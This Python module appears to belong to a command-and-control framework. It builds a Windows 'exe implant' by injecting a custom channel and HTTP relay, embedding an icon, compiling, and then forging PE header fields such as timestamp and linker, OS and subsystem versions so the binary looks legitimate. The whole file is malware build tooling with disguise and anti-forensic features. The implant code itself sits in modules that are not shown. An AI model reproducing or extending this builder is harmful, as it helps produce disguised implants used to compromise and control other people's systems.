from ...blocking_io import read_build_b64, run_in_thread
from ..utils.paths import project, cleanup
from ..utils.prep import (
    replace as replace_placeholders,
    cleanup as cleanup_build,
    inject_preface,
    inject_custom_channel,
    inject_custom_http_relay,
)
from ..utils.pe import (
    embed_icon,
    create_pe_strings,
    timestamp,
    major_linker_version,
    minor_linker_version,
    major_os_version,
    minor_os_version,
    major_image_version,
    minor_image_version,
    major_subsystem_version,
    minor_subsystem_version,
)
from ..utils.build import exe as compile_main
from ..utils.migrate import migrate


async def main(body, tag):
    # Builds an exe implant
    config = body["config"]

    src = None
    try:
        src = await project(body)
        await run_in_thread(cleanup_build, src)
        await inject_custom_channel(config, src)
        await inject_custom_http_relay(config, src)
        build_tag = await replace_placeholders(
            src, config, tag, body.get("implant_base", "stageless")
        )

        if config.get("create_pe_strings"):
            await create_pe_strings(config, src)

        if config.get("preface"):
            await inject_preface(config, src)

        # ICON ==================================================================

        icon_obj = None
        if config.get("exe_icon"):
            icon_obj = await embed_icon(config, tag)
            if isinstance(icon_obj, dict):
                return icon_obj

        # COMPILE ===============================================================

        build = await compile_main(config, tag, body, icon_obj=icon_obj)
        if build.get("status") == "failure":
            return build

        #######################
        #   POST PROCESSING   #
        #######################

        built_exe = build["path"]

        # NT HEADERS ============================================================

        if config.get("pe_timestamp"):
            built_exe = await timestamp(config, tag, built_exe)
        if config.get("pe_major_linker_version") is not None:
            built_exe = await major_linker_version(config, tag, built_exe)
        if config.get("pe_minor_linker_version") is not None:
            built_exe = await minor_linker_version(config, tag, built_exe)
        if config.get("pe_major_os_version") is not None:
            built_exe = await major_os_version(config, tag, built_exe)
        if config.get("pe_minor_os_version") is not None:
            built_exe = await minor_os_version(config, tag, built_exe)
        if config.get("pe_major_image_version") is not None:
            built_exe = await major_image_version(config, tag, built_exe)
        if config.get("pe_minor_image_version") is not None:
            built_exe = await minor_image_version(config, tag, built_exe)
        if config.get("pe_major_subsystem_version") is not None:
            built_exe = await major_subsystem_version(config, tag, built_exe)
        if config.get("pe_minor_subsystem_version") is not None:
            built_exe = await minor_subsystem_version(config, tag, built_exe)

        if build_tag:
            await migrate(build_tag, built_exe, config, tag, body, icon_obj=icon_obj)

        # FINAL OUTPUT ==========================================================

        data = await read_build_b64(built_exe)

        return {
            "status": "success",
            "message": "Implant built successfully",
            "bytes": data,
            "stdout": build["stdout"],
            "stderr": build["stderr"],
        }
    finally:
        await cleanup(tag)
        await run_in_thread(cleanup_build, src)
